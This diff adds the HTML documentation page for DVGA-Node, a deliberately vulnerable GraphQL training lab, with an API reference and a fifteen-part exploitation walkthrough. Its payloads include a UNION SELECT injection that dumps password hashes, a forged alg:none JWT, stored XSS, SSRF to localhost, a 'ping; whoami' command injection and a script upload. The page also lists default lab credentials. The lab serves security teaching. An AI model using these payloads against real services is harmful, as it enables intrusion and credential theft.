@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DVGA-Node: GraphQL API & Vulnerability Documentation</title>
+  <meta name="description" content="Comprehensive API reference and vulnerability walkthrough guide for Damn Vulnerable GraphQL Application (DVGA-Node)">
+  <link rel="stylesheet" href="/docs.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="logo">
+      <span class="logo-accent">DVGA</span><span class="logo-main">-Node</span>
+      <span class="logo-subtitle">API & Vulnerability Docs</span>
+    </div>
+    <nav class="nav-links">
+      <a href="/">Home</a>
+      <a href="/playground">Playground</a>
+      <a href="/docs" class="active">Docs</a>
+    </nav>
+  </header>
+
+  <div class="docs-container">
+    <!-- Sidebar / Table of Contents -->
+    <aside class="sidebar">
+      <div class="sidebar-section">
+        <h5 class="sidebar-section-title">Getting Started</h5>
+        <ul class="sidebar-nav">
+          <li><a href="#overview">Overview & Endpoint</a></li>
+          <li><a href="#authentication">Authentication</a></li>
+          <li><a href="#rest-endpoints">REST Endpoints</a></li>
+        </ul>
+      </div>
+
+      <div class="sidebar-section">
+        <h5 class="sidebar-section-title">GraphQL Schema</h5>
+        <ul class="sidebar-nav">
+          <li><a href="#schema-types">Object Types</a></li>
+          <li><a href="#schema-queries">Queries Reference</a></li>
+          <li><a href="#schema-mutations">Mutations Reference</a></li>
+        </ul>
+      </div>
+
+      <div class="sidebar-section">
+        <h5 class="sidebar-section-title">Vulnerability Guides</h5>
+        <ul class="sidebar-nav">
+          <li><a href="#vuln-bola">1. BOLA</a></li>
+          <li><a href="#vuln-idor">2. IDOR (Write)</a></li>
+          <li><a href="#vuln-jwt">3. Weak JWT Validation</a></li>
+          <li><a href="#vuln-bac">4. Broken Access Control</a></li>
+          <li><a href="#vuln-sqli">5. SQL Injection</a></li>
+          <li><a href="#vuln-storedxss">6. Stored XSS</a></li>
+          <li><a href="#vuln-ssrf">7. SSRF</a></li>
+          <li><a href="#vuln-bruteforce">8. Brute Force</a></li>
+          <li><a href="#vuln-cmdexec">9. Command Execution</a></li>
+          <li><a href="#vuln-introspection">10. Introspection Exposure</a></li>
+          <li><a href="#vuln-excessive">11. Excessive Data Exposure</a></li>
+          <li><a href="#vuln-fieldauth">12. Field Authorization</a></li>
+          <li><a href="#vuln-errorleak">13. Sensitive Error Leakage</a></li>
+          <li><a href="#vuln-fileupload">14. Insecure File Upload</a></li>
+          <li><a href="#vuln-weakpass">15. Weak Password Policy</a></li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="content">
+      <!-- Section: Overview -->
+      <section id="overview" class="section">
+        <div class="hero-section">
+          <h1>Damn Vulnerable GraphQL Application</h1>
+          <p class="subtitle">Complete GraphQL API Reference & Security Walkthrough Manual</p>
+        </div>
+
+        <h2>Overview & Endpoint</h2>
+        <p>
+          DVGA-Node is a deliberately vulnerable web application designed to teach the fundamentals of GraphQL security.
+          Unlike traditional REST APIs that utilize multiple endpoints, GraphQL uses a single gateway route that supports highly dynamic client-defined querying.
+        </p>
+
+        <div class="endpoint-card">
+          <div class="endpoint-method">POST</div>
+          <div class="endpoint-path">/graphql</div>
+          <div class="endpoint-desc">Global GraphQL Endpoint</div>
+        </div>
+
+        <p>All queries and mutations described in this document must be sent as HTTP <code>POST</code> requests with a JSON body to this single endpoint.</p>
+        
+        <h3>Request Format</h3>
+        <pre><code class="language-json">{
+  "query": "query { users { id email } }",
+  "variables": {}
+}</code></pre>
+      </section>
+
+      <!-- Section: Authentication -->
+      <section id="authentication" class="section">
+        <h2>Authentication Flow</h2>
+        <p>
+          DVGA-Node uses JSON Web Tokens (JWT) for authentication. Once signed in, you must provide your token in the 
+          HTTP headers of subsequent requests to authenticate your identity.
+        </p>
+
+        <h3>The Authorization Header</h3>
+        <pre><code class="language-http">Authorization: Bearer <your_jwt_token></code></pre>
+
+        <h3>Built-in Lab Accounts</h3>
+        <p>Use these credentials to authenticate as different entities and observe differences in authorization levels.</p>
+        
+        <table>
+          <thead>
+            <tr>
+              <th>Role</th>
+              <th>Email</th>
+              <th>Password</th>
+              <th>Description</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><span class="badge admin">admin</span></td>
+              <td><code>admin@lab.local</code></td>
+              <td><code>Admin123!</code></td>
+              <td>Full administrative privileges. Can execute command diagnostics.</td>
+            </tr>
+            <tr>
+              <td><span class="badge info">user</span></td>
+              <td><code>user_a@lab.local</code></td>
+              <td><code>user_a_pass</code></td>
+              <td>Alice (Profile ID: 2). Regular customer role.</td>
+            </tr>
+            <tr>
+              <td><span class="badge info">user</span></td>
+              <td><code>user_b@lab.local</code></td>
+              <td><code>user_b_pass</code></td>
+              <td>Bob (Profile ID: 3). Regular customer role.</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h3>Login Mutation Example</h3>
+        <pre><code class="language-graphql">mutation {
+  login(email: "user_a@lab.local", password: "user_a_pass") {
+    token
+    user {
+      id
+      email
+      role
+    }
+  }
+}</code></pre>
+      </section>
+
+      <!-- Section: REST Endpoints -->
+      <section id="rest-endpoints" class="section">
+        <h2>REST Endpoints</h2>
+        <p>In addition to the GraphQL gateway, the server hosts several secondary REST endpoints to support auxiliary services:</p>
+
+        <div class="endpoint-card">
+          <div class="endpoint-method get-method">GET</div>
+          <div class="endpoint-path">/healthz</div>
+          <div class="endpoint-desc">Retrieves current server diagnostic information and security state.</div>
+        </div>
+
+        <div class="endpoint-card">
+          <div class="endpoint-method post-method">POST</div>
+          <div class="endpoint-path">/api/upload</div>
+          <div class="endpoint-desc">Auxiliary REST endpoint for file uploading (Accepts multi-part forms with a <code>file</code> field).</div>
+        </div>
+      </section>
+
+      <!-- Section: Object Types -->
+      <section id="schema-types" class="section">
+        <h2>GraphQL Object Types</h2>
+        <p>The following type definitions represent the domain entities stored within the DVGA database:</p>
+
+        <div class="type-grid">
+          <div class="type-block">
+            <h4>User</h4>
+            <ul>
+              <li><code>id: ID!</code></li>
+              <li><code>email: String!</code></li>
+              <li><code>role: String!</code></li>
+              <li><code>is_admin: Boolean!</code></li>
+              <li><code>password_hash: String</code> <span class="leak-indicator">Leaked Field!</span></li>
+              <li><code>profile: Profile</code></li>
+            </ul>
+          </div>
+
+          <div class="type-block">
+            <h4>Profile</h4>
+            <ul>
+              <li><code>id: ID!</code></li>
+              <li><code>userId: ID!</code></li>
+              <li><code>fullName: String</code></li>
+              <li><code>bio: String</code></li>
+              <li><code>phone: String</code></li>
+              <li><code>address: String</code></li>
+            </ul>
+          </div>
+
+          <div class="type-block">
+            <h4>Product</h4>
+            <ul>
+              <li><code>id: ID!</code></li>
+              <li><code>name: String!</code></li>
+              <li><code>price: Float!</code></li>
+              <li><code>description: String</code></li>
+            </ul>
+          </div>
+
+          <div class="type-block">
+            <h4>Order</h4>
+            <ul>
+              <li><code>id: ID!</code></li>
+              <li><code>userId: ID</code></li>
+              <li><code>productId: ID</code></li>
+              <li><code>quantity: Int!</code></li>
+              <li><code>orderDate: String</code></li>
+              <li><code>trackingNumber: String</code></li>
+              <li><code>product: Product</code></li>
+              <li><code>user: User</code></li>
+            </ul>
+          </div>
+
+          <div class="type-block">
+            <h4>Comment</h4>
+            <ul>
+              <li><code>id: ID!</code></li>
+              <li><code>userId: ID!</code></li>
+              <li><code>commentText: String!</code></li>
+              <li><code>createdAt: String!</code></li>
+              <li><code>user: User</code></li>
+            </ul>
+          </div>
+
+          <div class="type-block">
+            <h4>SystemDiagnostics</h4>
+            <ul>
+              <li><code>command: String!</code></li>
+              <li><code>output: String</code></li>
+              <li><code>status: String</code></li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section: Queries -->
+      <section id="schema-queries" class="section">
+        <h2>Queries Reference</h2>
+        
+        <div class="query-block">
+          <h3>profile(id: ID!): Profile</h3>
+          <p>Fetches a specific user profile by its profile ID. BOLA vulnerable.</p>
+          <pre><code class="language-graphql">query {
+  profile(id: "3") {
+    fullName
+    phone
+    address
+  }
+}</code></pre>
+        </div>
+
+        <div class="query-block">
+          <h3>orders(userId: ID!): [Order]</h3>
+          <p>Retrieves all orders placed by a specific user ID.</p>
+        </div>
+
+        <div class="query-block">
+          <h3>order(id: ID!): Order</h3>
+          <p>Fetches details of a single order by its unique order ID.</p>
+        </div>
+
+        <div class="query-block">
+          <h3>productsSearch(query: String!): [Product]</h3>
+          <p>Searches product database names and descriptions matching the query string. SQL Injection vulnerable.</p>
+          <pre><code class="language-graphql">query {
+  productsSearch(query: "Laptop") {
+    name
+    price
+  }
+}</code></pre>
+        </div>
+
+        <div class="query-block">
+          <h3>comments: [Comment]</h3>
+          <p>Retrieves the global feed of stored comments. Reflects Stored XSS.</p>
+        </div>
+
+        <div class="query-block">
+          <h3>fetchMetadata(url: String!): String</h3>
+          <p>Fetches raw HTML/metadata content from an external address. SSRF vulnerable.</p>
+          <pre><code class="language-graphql">query {
+  fetchMetadata(url: "http://example.com")
+}</code></pre>
+        </div>
+
+        <div class="query-block">
+          <h3>runDiagnostics(cmd: String!): SystemDiagnostics</h3>
+          <p>Runs internal system tests (available to admin users). Command Injection vulnerable.</p>
+        </div>
+
+        <div class="query-block">
+          <h3>users: [User]</h3>
+          <p>Lists all users in the system. Excessive Data Exposure and BAC vulnerable.</p>
+        </div>
+      </section>
+
+      <!-- Section: Mutations -->
+      <section id="schema-mutations" class="section">
+        <h2>Mutations Reference</h2>
+
+        <div class="query-block">
+          <h3>login(email: String!, password: String!): AuthPayload</h3>
+          <p>Authenticates users and returns a JWT token. Weak password & brute force vulnerable.</p>
+        </div>
+
+        <div class="query-block">
+          <h3>updateBio(bio: String!): Profile</h3>
+          <p>Updates the bio of the currently authenticated user profile. Stored XSS vulnerable.</p>
+          <pre><code class="language-graphql">mutation {
+  updateBio(bio: "Security enthusiast") {
+    bio
+  }
+}</code></pre>
+        </div>
+
+        <div class="query-block">
+          <h3>updateProfileAddress(profileId: ID!, address: String!): Profile</h3>
+          <p>Modifies address details on a profile ID. IDOR vulnerable.</p>
+          <pre><code class="language-graphql">mutation {
+  updateProfileAddress(profileId: "3", address: "123 Main St") {
+    id
+    address
+  }
+}</code></pre>
+        </div>
+
+        <div class="query-block">
+          <h3>uploadFile(filename: String!, base64Content: String!): File!</h3>
+          <p>Uploads a file via Base64 format to the server public folder. Unrestricted file upload vulnerable.</p>
+        </div>
+      </section>
+
+      <!-- Section: Vulnerabilities Walkthrough -->
+      <section id="vulnerability-walkthrough" class="section">
+        <h2>Vulnerability Walkthrough Guide</h2>
+        <p>This manual catalogs the vulnerability objectives and challenges. Reveal the steps to review queries, exploitation methods, and secure mitigation solutions.</p>
+
+        <!-- 1. BOLA -->
+        <div id="vuln-bola" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>1. Broken Object Level Authorization (BOLA)</h3>
+            <span class="badge critical">critical</span>
+          </div>
+          <p><strong>Description:</strong> BOLA (also known as IDOR) occurs when the system fetches internal records by user-supplied identifier parameters without confirming that the requesting user owns or has permission to read that record.</p>
+          <p><strong>Objective:</strong> Query Bob's user profile (Profile ID 3) while authenticated as Alice.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <ol>
+                <li>Authenticate as Alice (<code>user_a@lab.local</code>) to acquire her JWT token.</li>
+                <li>Send a query requesting the profile data for Bob's ID (profile ID <code>3</code>).</li>
+              </ol>
+              <pre><code class="language-graphql">query {
+  profile(id: "3") {
+    fullName
+    phone
+    address
+  }
+}</code></pre>
+              <p>Observe that in <strong>Vulnerable</strong> mode, the server happily exposes Bob's private phone number and physical address. In <strong>Mitigated</strong> mode, access is correctly blocked.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- 2. IDOR -->
+        <div id="vuln-idor" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>2. Insecure Direct Object Reference (IDOR - Write)</h3>
+            <span class="badge high">high</span>
+          </div>
+          <p><strong>Description:</strong> IDOR on write actions allows an attacker to alter objects belonging to other users by changing the identifier arguments in GraphQL mutation queries.</p>
+          <p><strong>Objective:</strong> Change the physical address of Bob's user profile (ID 3) while authenticated as Alice.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <ol>
+                <li>Log in as Alice.</li>
+                <li>Submit the <code>updateProfileAddress</code> mutation targeting Bob's profile ID (ID <code>3</code>).</li>
+              </ol>
+              <pre><code class="language-graphql">mutation {
+  updateProfileAddress(profileId: "3", address: "COMPROMISED ADDRESS") {
+    id
+    address
+  }
+}</code></pre>
+              <p>In <strong>Vulnerable</strong> mode, Bob's profile address is modified. Mitigated mode prevents this by validating that the authenticated session user matches the profile owner.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- 3. Weak JWT -->
+        <div id="vuln-jwt" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>3. Weak JWT Validation</h3>
+            <span class="badge critical">critical</span>
+          </div>
+          <p><strong>Description:</strong> Flaws in cryptographic signature checks allow attackers to forge valid authentication tokens to assume administrative identities.</p>
+          <p><strong>Objective:</strong> Access administrative queries (like <code>users</code>) by forging a JWT token payload.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <ol>
+                <li>Craft a JWT token header with <code>"alg": "none"</code>.</li>
+                <li>Define a claims payload claiming administrative credentials: <code>{ "id": 2, "role": "admin", "email": "user_a@lab.local" }</code>.</li>
+                <li>Encode both parts into base64, join them with a period, and add an empty signature: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6Miwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJ1c2VyX2FAbGFiLmxvY2FsIn0.</code></li>
+                <li>Submit this string as your <code>Authorization: Bearer <token></code> header and execute an administrative query like <code>users</code>.</li>
+              </ol>
+            </div>
+          </details>
+        </div>
+
+        <!-- 4. BAC -->
+        <div id="vuln-bac" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>4. Broken Access Control</h3>
+            <span class="badge high">high</span>
+          </div>
+          <p><strong>Description:</strong> Privileged queries or fields (such as listing all registered users) lack role validation checks, exposing administrative details to ordinary users.</p>
+          <p><strong>Objective:</strong> List all registered users in the database using a regular customer session.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <ol>
+                <li>Authenticate as any regular user account.</li>
+                <li>Run the administrative <code>users</code> query to fetch all system users.</li>
+              </ol>
+              <pre><code class="language-graphql">query {
+  users {
+    id
+    email
+    role
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 5. SQL Injection -->
+        <div id="vuln-sqli" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>5. SQL Injection (SQLi)</h3>
+            <span class="badge critical">critical</span>
+          </div>
+          <p><strong>Description:</strong> Direct dynamic string construction in SQL statements allows arbitrary database statements execution, exposing the entire database contents.</p>
+          <p><strong>Objective:</strong> Leak credentials from the database user table using dynamic product searches.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Perform a <code>UNION SELECT</code> injection inside the <code>productsSearch</code> query argument to leak details from the database user table:</p>
+              <pre><code class="language-graphql">query {
+  productsSearch(query: "Audit%' UNION SELECT id, email, password_hash, role, '1' FROM users --") {
+    id
+    name
+    price
+    description
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 6. Stored XSS -->
+        <div id="vuln-storedxss" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>6. Stored XSS</h3>
+            <span class="badge high">high</span>
+          </div>
+          <p><strong>Description:</strong> Persisting raw, unescaped HTML scripts into the database allows execution of client-side scripts inside the browser context of other visitors.</p>
+          <p><strong>Objective:</strong> Update profile bio metadata to execute client-side scripts inside browsers.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Update your profile bio or submit a comment containing a standard script payload:</p>
+              <pre><code class="language-graphql">mutation {
+  updateBio(bio: "&lt;img src=x onerror=alert('StoredXSS')&gt;") {
+    bio
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 7. SSRF -->
+        <div id="vuln-ssrf" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>7. Server-Side Request Forgery (SSRF)</h3>
+            <span class="badge high">high</span>
+          </div>
+          <p><strong>Description:</strong> The server acts as an open proxy, fetching dynamic URLs supplied by client parameters without blocking internal loopbacks or RFC 1918 private scopes.</p>
+          <p><strong>Objective:</strong> Request loopback addresses or internal health metrics on the application port.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Submit a request asking the server to query internal administrative services or the app health diagnostics directly:</p>
+              <pre><code class="language-graphql">query {
+  fetchMetadata(url: "http://localhost:5013/healthz")
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 8. Brute Force -->
+        <div id="vuln-bruteforce" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>8. Brute Force Throttling Failure</h3>
+            <span class="badge medium">medium</span>
+          </div>
+          <p><strong>Description:</strong> Lack of login throttling or account lockouts allows rapid, automated credential spray attacks against users.</p>
+          <p><strong>Objective:</strong> Perform rapid authentication mutation requests without throttling triggers.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <p>Observe the execution metrics inside vulnerable vs secure modes. Vulnerable mode runs instantly, while secure mode introduces deliberate computational delays to minimize dictionary attacks.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- 9. Command Injection -->
+        <div id="vuln-cmdexec" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>9. Command Execution</h3>
+            <span class="badge critical">critical</span>
+          </div>
+          <p><strong>Description:</strong> Passing unvalidated shell arguments directly to system exec APIs allows attackers to execute arbitrary system OS commands.</p>
+          <p><strong>Objective:</strong> Execute secondary shell processes through diagnostic queries.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Inject semicolon or pipeline command separators to run secondary shell processes:</p>
+              <pre><code class="language-graphql">query {
+  runDiagnostics(cmd: "ping 127.0.0.1; whoami") {
+    output
+    status
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 10. Introspection -->
+        <div id="vuln-introspection" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>10. Introspection Schema Exposure</h3>
+            <span class="badge low">low</span>
+          </div>
+          <p><strong>Description:</strong> Leaving GraphQL introspection queries enabled in production allows scans that automatically map the entire API surface structure.</p>
+          <p><strong>Objective:</strong> Extract all active type definitions via default schema queries.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Fetch the system schema details using standard meta-queries:</p>
+              <pre><code class="language-graphql">query {
+  __schema {
+    types {
+      name
+    }
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 11. Excessive Data -->
+        <div id="vuln-excessive" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>11. Excessive Data Exposure</h3>
+            <span class="badge medium">medium</span>
+          </div>
+          <p><strong>Description:</strong> Querying database rows entirely (e.g., selecting all columns) returns sensitive parameters (like hashed password credentials) that are reflected in the API schema.</p>
+          <p><strong>Objective:</strong> Retrieve password hash definitions by requesting additional user attributes.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Query the user records and explicitly request the <code>password_hash</code> field:</p>
+              <pre><code class="language-graphql">query {
+  users {
+    email
+    password_hash
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 12. Field Auth -->
+        <div id="vuln-fieldauth" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>12. Field-Level Authorization Failure</h3>
+            <span class="badge medium">medium</span>
+          </div>
+          <p><strong>Description:</strong> Nested relations inside parent types lack authorization context checks, allowing attackers to access details of other user accounts through child relation loops.</p>
+          <p><strong>Objective:</strong> Access administrative relational data (email, roles) using nested user orders relations.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Query order details and request relational nested information of the user linked to that order:</p>
+              <pre><code class="language-graphql">query {
+  order(id: "2") {
+    id
+    user {
+      email
+      role
+      is_admin
+    }
+  }
+}</code></pre>
+            </div>
+          </details>
+        </div>
+
+        <!-- 13. Error Leakage -->
+        <div id="vuln-errorleak" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>13. Sensitive Error Leakage</h3>
+            <span class="badge low">low</span>
+          </div>
+          <p><strong>Description:</strong> Intercepting and reflecting raw SQL exceptions or stack traces helps attackers understand system infrastructure and refine payloads.</p>
+          <p><strong>Objective:</strong> Generate error exceptions and review database snippets inside return payloads.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Send invalid characters or malformed queries to trigger SQL exceptions, then review the detailed stack trace extensions included in the GraphQL errors array response.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- 14. File Upload -->
+        <div id="vuln-fileupload" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>14. Insecure File Upload Validation</h3>
+            <span class="badge high">high</span>
+          </div>
+          <p><strong>Description:</strong> The server saves files directly into the web root directory without validating file extensions or MIME types, enabling HTML-based XSS attacks or command injection.</p>
+          <p><strong>Objective:</strong> Upload executable HTML content via base64 upload mutations.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <h4>Exploitation Steps:</h4>
+              <p>Submit the <code>uploadFile</code> mutation with an HTML filename and write client-side script payloads in the Base64 content body:</p>
+              <pre><code class="language-graphql">mutation {
+  uploadFile(filename: "exploit.html", base64Content: "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=") {
+    id
+    filename
+    filePath
+  }
+}</code></pre>
+              <p>After upload, copy the returned <code>filePath</code> and access it directly via your browser to execute the script.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- 15. Weak Password -->
+        <div id="vuln-weakpass" class="vuln-guide-card">
+          <div class="vuln-guide-header">
+            <h3>15. Weak Password Policy</h3>
+            <span class="badge medium">medium</span>
+          </div>
+          <p><strong>Description:</strong> Enabling simple administrative passwords or keeping standard testing parameters active makes training labs highly susceptible to dictionary guesses.</p>
+          <p><strong>Objective:</strong> Enforce password complexity or attempt predictable logins against default administrators.</p>
+          
+          <details class="solution-details">
+            <summary class="solution-summary">
+              <span>View Exploitation Walkthrough & Payload</span>
+              <button class="reveal-btn">Toggle Solution</button>
+            </summary>
+            <div class="solution-content">
+              <p>Observe standard test users credentials. Alice, Bob, and Admin passwords can be parsed using rapid password dictionaries.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>DVGA-Node: Damn Vulnerable GraphQL Application (Node.js Edition). For educational testing purposes only.</p>
+  </footer>
+
+  <script>
+    // Smooth scrolling for sidebar links
+    document.querySelectorAll('.sidebar-nav a').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const targetId = this.getAttribute('href');
+        const targetSection = document.querySelector(targetId);
+        if (targetSection) {
+          targetSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          // Highlight active link
+          document.querySelectorAll('.sidebar-nav a').forEach(a => a.classList.remove('active'));
+          this.classList.add('active');
+        }
+      });
+    });
+
+    // Handle interactive Reveal Solution actions
+    document.querySelectorAll('.solution-details').forEach(details => {
+      const summary = details.querySelector('.solution-summary');
+      const label = details.querySelector('.reveal-btn');
+      
+      summary.addEventListener('click', () => {
+        // details.open is updated AFTER the click event handler finishes natively,
+        // so we check the current state and set the button text accordingly.
+        if (details.open) {
+          label.textContent = 'Toggle Solution';
+        } else {
+          label.textContent = 'Hide Solution';
+        }
+      });
+    });
+  </script>
+</body>
+
+</html>
